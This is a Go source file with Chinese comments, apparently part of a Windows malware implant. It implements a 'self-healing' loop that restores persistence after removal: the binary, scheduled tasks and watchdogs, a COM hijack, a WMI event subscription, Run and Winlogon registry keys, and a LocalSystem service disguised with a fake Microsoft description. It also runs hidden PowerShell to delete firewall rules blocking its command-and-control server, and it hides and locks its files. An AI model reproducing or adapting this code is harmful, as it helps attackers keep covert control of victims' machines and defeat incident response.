//go:build windows

package main

import (
	"log"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/registry"
)

// ═══ [8] 内存自愈线程 ═══
// 常驻内存，周期性检查并自动恢复被删除的持久化组件
// 即使磁盘文件被删，进程仍在内存中运行并能重建一切

// selfHealLoop 内存自愈主循环：每 60 秒检查一次，自动修复被破坏的持久化
func selfHealLoop() {
	// 首次延迟 30 秒，避免与 installAgent 冲突
	time.Sleep(30 * time.Second)

	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		healFirewall()
		healBinary()
		healTasks()
		healCOMHijack()
		healWMI()
		healRegistry()
		healService()
		healACLAndHide()
	}
}

// healBinary 检查并恢复被删除的二进制文件（仅从自身进程恢复，不使用旧备份）
func healBinary() {
	exePath := sid().ExePath
	if _, err := os.Stat(exePath); err == nil {
		return // 文件存在，无需恢复
	}

	// 从自身进程的可执行文件恢复（始终是当前运行版本，不会回退）
	selfPath, err := os.Executable()
	if err == nil {
		if data, err := os.ReadFile(selfPath); err == nil && len(data) > 1024 {
			os.MkdirAll(sid().Dir, 0755)
			if os.WriteFile(exePath, data, 0755) == nil {
				log.Printf("[自愈] 从自身进程恢复二进制: %s", exePath)
				hideFiles()
				lockdownACL()
				return
			}
		}
	}
}

// healTasks 检查并恢复被删除的计划任务（cradle 模式）
func healTasks() {
	s := sid()
	if !taskExistsQuiet(s.TaskBoot) {
		log.Printf("[自愈] 重建开机任务: %s", s.TaskBoot)
		installBootTask()
	}
	if !taskExistsQuiet(s.TaskGuardA) {
		log.Printf("[自愈] 重建看门狗A: %s", s.TaskGuardA)
		installWatchdogA()
	}
	if !taskExistsQuiet(s.TaskGuardB) {
		log.Printf("[自愈] 重建看门狗B: %s", s.TaskGuardB)
		installWatchdogB()
	}
}

// healCOMHijack 检查并恢复 COM 劫持持久化
func healCOMHijack() {
	if !isCOMHijackInstalled() {
		log.Printf("[自愈] 重建 COM 劫持持久化")
		installCOMHijack()
	}
}

// healService 检查并恢复 Windows 服务
func healService() {
	s := sid()
	// 通过 sc query 检查服务是否存在
	cmd := exec.Command("sc", "query", s.SvcName)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	if err := cmd.Run(); err == nil {
		return // 服务存在
	}
	// 服务不存在，重建
	log.Printf("[自愈] 重建 Windows 服务: %s", s.SvcName)
	installService()
}

// healRegistry 检查并恢复注册表 Run 键（先检查再写入，避免每轮盲写）
func healRegistry() {
	s := sid()
	needFix := false

	// 检查 Run 键
	k, err := registry.OpenKey(registry.LOCAL_MACHINE, regRunPath, registry.QUERY_VALUE)
	if err == nil {
		val, _, err := k.GetStringValue(s.RegName)
		if err != nil || val == "" {
			needFix = true
		}
		k.Close()
	} else {
		needFix = true
	}

	// 检查 Winlogon 键
	k2, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`, registry.QUERY_VALUE)
	if err == nil {
		val, _, err := k2.GetStringValue("UserInitMprLogonScript")
		if err != nil || val == "" {
			needFix = true
		}
		k2.Close()
	} else {
		needFix = true
	}

	if needFix {
		log.Printf("[自愈] 重建注册表持久化")
		installRegistryAndRecovery()
	}
}

// healWMI 检查并恢复 WMI 事件订阅
func healWMI() {
	s := sid()
	// 通过 PowerShell 查询 WMI 订阅是否存在
	checkCmd := exec.Command("powershell.exe", "-ep", "bypass", "-w", "hidden", "-NoProfile", "-Command",
		`$f = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='`+s.WmiName+`'" -EA SilentlyContinue; if($f){echo 'EXISTS'}`)
	checkCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	out, err := checkCmd.Output()
	if err == nil && strings.Contains(string(out), "EXISTS") {
		return // WMI 订阅存在
	}
	log.Printf("[自愈] 重建 WMI 事件订阅: %s", s.WmiName)
	installWMI()
}

// healACLAndHide 周期性刷新 ACL 锁定和文件隐藏
func healACLAndHide() {
	if _, err := os.Stat(sid().Dir); err != nil {
		return // 目录不存在，healBinary 会负责恢复
	}
	lockdownACL()
	hideFiles()
}

// ═══ [6] Windows 服务注册 ═══
// 使用 sc.exe 注册为 Windows 服务，比计划任务更难删除
// 服务设置为自动恢复（失败后自动重启）

// installService 注册 Windows 服务
func installService() {
	s := sid()

	// 创建服务
	createCmd := exec.Command("sc", "create", s.SvcName,
		"binPath=", s.ExePath,
		"start=", "auto",
		"DisplayName=", s.SvcDisplay,
		"obj=", "LocalSystem",
	)
	createCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	createCmd.Run()

	// 设置服务描述
	descCmd := exec.Command("sc", "description", s.SvcName, "Provides network configuration and diagnostic services for Windows.")
	descCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	descCmd.Run()

	// 设置故障恢复策略：失败后 10 秒重启，3 次
	failCmd := exec.Command("sc", "failure", s.SvcName,
		"reset=", "86400",
		"actions=", "restart/10000/restart/10000/restart/10000",
	)
	failCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	failCmd.Run()

	// 启动服务
	startCmd := exec.Command("sc", "start", s.SvcName)
	startCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	startCmd.Run()
}

// healFirewall 清理防火墙中封锁 C2 IP 的出站规则
func healFirewall() {
	c2Host := extractHost(agentServerURL)
	if c2Host == "" {
		return
	}

	// 用 PowerShell 移除所有封锁 C2 IP 的出站 Block 规则
	ps := `Get-NetFirewallRule -EA SilentlyContinue|Where-Object{$_.Action -eq 'Block' -and $_.Direction -eq 'Outbound'}|ForEach-Object{` +
		`$a=Get-NetFirewallAddressFilter -AssociatedNetFirewallRule $_ -EA SilentlyContinue;` +
		`if($a.RemoteAddress -match '` + c2Host + `'){Remove-NetFirewallRule -Name $_.Name -EA SilentlyContinue}}`

	cmd := exec.Command("powershell.exe", "-ep", "bypass", "-w", "hidden", "-NonI", "-c", ps)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	if err := cmd.Run(); err == nil {
		// 静默成功，不输出日志避免暴露
	}
}
